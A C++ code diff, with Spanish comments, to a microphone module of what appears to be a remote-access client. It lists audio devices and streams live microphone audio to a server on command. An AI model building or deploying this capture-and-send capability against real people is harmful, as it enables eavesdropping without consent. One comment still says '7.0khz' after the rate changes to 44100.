@@ -1,11 +1,13 @@
 #include "mod_mic.hpp"
 
 constexpr int NUM_BUFFERS = 2;
-constexpr int SAMPLE_RATE = 7000; // 7.0khz
+constexpr int SAMPLE_RATE = 44100; // 7.0khz
 constexpr int NUM_CHANNELS = 2;
 constexpr int BITS_PER_SAMPLE = 16;
-constexpr int BUFFER_SIZE = SAMPLE_RATE * NUM_CHANNELS * BITS_PER_SAMPLE / 8 / 10; //decima de segundo
 
+constexpr int BUFFER_SIZE = SAMPLE_RATE * NUM_CHANNELS * BITS_PER_SAMPLE / 8 / 4; //cuarto de segundo
+
+extern Cliente* cCliente;
 
 std::vector<std::string> Mod_Mic::m_ObtenerDispositivos() {
     
@@ -35,19 +37,19 @@ void Mod_Mic::m_Enviar_Dispositivos() {
 
     if (vc_devices.size() > 0) {
         strSalida = std::to_string(EnumComandos::Mic_Refre_Resultado);
-        strSalida.append(1, '\\');
+        strSalida.append(1, CMD_DEL);
         for (auto strDevice : vc_devices) {
             strSalida += strDevice;
-            strSalida.append(1, '\\');
+            strSalida.append(1, CMD_DEL);
         }
         strSalida = strSalida.substr(0, strSalida.size() - 1);
-        this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
+        cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
     }
     else {
         strSalida = "No hay dispositivos";
     }
 
-    this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
+    int iSent = cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
 
 }
 
@@ -119,22 +121,24 @@ void Mod_Mic::m_LiveMicTh() {
 
     //Real time
     // Bucle principal de captura y envío de audio
-    char newBuffer[BUFFER_SIZE + 5];
+    std::string strHeader = std::to_string(EnumComandos::Mic_Live_Packet);
+    strHeader.append(1, CMD_DEL);
+    int iHeaderSize = strHeader.size();
+    int iBuffsize = BUFFER_SIZE + iHeaderSize;
+    char* newBuffer = new char[iBuffsize];
     while (this->isLiveMic) {
         for (int i = 0; i < NUM_BUFFERS; i++) {
             WAVEHDR& h = headers[i];
             if (h.dwFlags & WHDR_DONE) {
                 // Enviar datos de audio al servidor
-                memset(newBuffer, 0, sizeof(newBuffer));
+                ZeroMemory(newBuffer, iBuffsize);
 
+                std::memcpy(newBuffer, strHeader.c_str(), iHeaderSize);
+                std::memcpy(newBuffer + iHeaderSize, h.lpData, h.dwBufferLength);
                 
-                std::strcpy(newBuffer, "LMIC");
-                std::strcpy(newBuffer + 4, "\\");
-                std::memcpy(newBuffer + 5, h.lpData, h.dwBufferLength);
-                
-                int iSent = this->ptr_copy->cSend(this->sckSocket, newBuffer, sizeof(newBuffer), 0, false);
+                int iSent = cCliente->cSend(this->sckSocket, newBuffer, iBuffsize, 0, false);
 #ifdef ___DEBUG_
-                std::cout << "AUDIO " << iSent << " bytes sent - "<<std::endl;
+                std::cout << "AUDIO " << iSent << " bytes sent\n";
 #endif
                 Sleep(50);
                 
@@ -146,6 +150,7 @@ void Mod_Mic::m_LiveMicTh() {
         }
     }
 
+
     // Detener y limpiar la grabación
     waveInStop(wi);
     for (int i = 0; i < NUM_BUFFERS; i++) {
@@ -154,11 +159,18 @@ void Mod_Mic::m_LiveMicTh() {
     }
     waveInClose(wi);
 
+    if (newBuffer) {
+        delete[] newBuffer;
+        newBuffer = nullptr;
+    }
+
     delete[] headers;
     for (int i = 0; i < NUM_BUFFERS; i++) {
         delete[] buffers[i];
     }
     delete[] buffers;
+
+
 #ifdef ___DEBUG_
     std::cout << "[!] thLiveMicTh finalizada" << std::endl;
 #endif // ___DEBUG_
